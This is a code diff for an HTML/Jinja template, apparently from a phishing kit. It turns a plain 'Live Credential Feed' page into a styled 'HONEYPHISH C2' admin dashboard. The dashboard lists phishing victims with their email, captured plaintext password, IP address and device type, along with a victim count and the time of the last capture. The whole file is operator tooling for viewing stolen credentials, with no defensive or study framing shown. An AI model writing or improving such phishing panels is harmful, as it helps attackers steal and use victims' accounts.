@@ -1,38 +1,169 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>C2 Admin Panel</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HONEYPHISH C2 // ADMIN</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #0d1117; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
-        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; text-transform: uppercase; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
-        th { background-color: #161b22; color: #fff; }
-        tr:nth-child(even) { background-color: #161b22; }
-        .pass { color: #ff5555; font-weight: bold; }
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --text-main: #c9d1d9;
+            --accent-green: #00ff41;
+            --accent-red: #ff3333;
+            --border-color: #30363d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'JetBrains Mono', monospace;
+            padding: 20px;
+        }
+
+        /* Header Area */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--accent-green);
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+        }
+
+        .brand { font-size: 24px; font-weight: bold; color: var(--accent-green); text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
+        .status { font-size: 14px; color: #8b949e; }
+        .live-dot { height: 10px; width: 10px; background-color: var(--accent-red); border-radius: 50%; display: inline-block; animation: blink 1s infinite; margin-right: 5px; }
+
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 6px;
+        }
+
+        .card h3 { font-size: 12px; color: #8b949e; text-transform: uppercase; margin-bottom: 10px; }
+        .card .number { font-size: 32px; font-weight: bold; color: #fff; }
+
+        /* Data Table */
+        .table-container {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        table { width: 100%; border-collapse: collapse; }
+        
+        th {
+            background-color: #21262d;
+            text-align: left;
+            padding: 12px 15px;
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #8b949e;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 14px;
+        }
+
+        tr:hover { background-color: #21262d; }
+
+        .tag {
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: bold;
+            border: 1px solid;
+        }
+
+        .tag-mobile { color: #e3b341; border-color: #e3b341; }
+        .tag-desktop { color: #79c0ff; border-color: #79c0ff; }
+        .password { color: var(--accent-red); font-weight: bold; }
+        .ip-addr { color: var(--accent-green); }
+
+        /* Animation */
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <h1>[*] Live Credential Feed</h1>
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>Time</th>
-            <th>IP Address</th>
-            <th>Device (User Agent)</th>
-            <th>Email</th>
-            <th>Captured Password</th>
-        </tr>
-        {% for v in victims %}
-        <tr>
-            <td>{{ v['id'] }}</td>
-            <td>{{ v['timestamp'] }}</td>
-            <td>{{ v['ip_address'] }}</td>
-            <td><small>{{ v['user_agent'] }}</small></td>
-            <td>{{ v['email'] }}</td>
-            <td class="pass">{{ v['password'] }}</td>
-        </tr>
-        {% endfor %}
-    </table>
+
+    <div class="header">
+        <div class="brand">> HONEYPHISH_C2</div>
+        <div class="status"><span class="live-dot"></span>SYSTEM ONLINE</div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="card">
+            <h3>Total Victims</h3>
+            <div class="number">{{ victims|length }}</div>
+        </div>
+        <div class="card">
+            <h3>Server Status</h3>
+            <div class="number" style="color: var(--accent-green);">ACTIVE</div>
+        </div>
+        <div class="card">
+            <h3>Last Capture</h3>
+            <div class="number" style="font-size: 16px; margin-top: 12px;">
+                {% if victims %}
+                    {{ victims[0]['timestamp'].split(' ')[1] }}
+                {% else %}
+                    Waiting...
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Timestamp</th>
+                    <th>IP Address (Source)</th>
+                    <th>Device Fingerprint</th>
+                    <th>Target Email</th>
+                    <th>Decrypted Pass</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for v in victims %}
+                <tr>
+                    <td>#{{ v['id'] }}</td>
+                    <td style="color: #8b949e;">{{ v['timestamp'] }}</td>
+                    <td class="ip-addr">{{ v['ip_address'] }}</td>
+                    <td>
+                        {% if 'iPhone' in v['user_agent'] or 'Android' in v['user_agent'] %}
+                            <span class="tag tag-mobile">MOBILE</span>
+                        {% else %}
+                            <span class="tag tag-desktop">DESKTOP</span>
+                        {% endif %}
+                        <span style="font-size: 11px; color: #8b949e; margin-left: 8px;">
+                            {{ v['user_agent'][:40] }}...
+                        </span>
+                    </td>
+                    <td>{{ v['email'] }}</td>
+                    <td class="password">{{ v['password'] }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
 </body>
 </html>
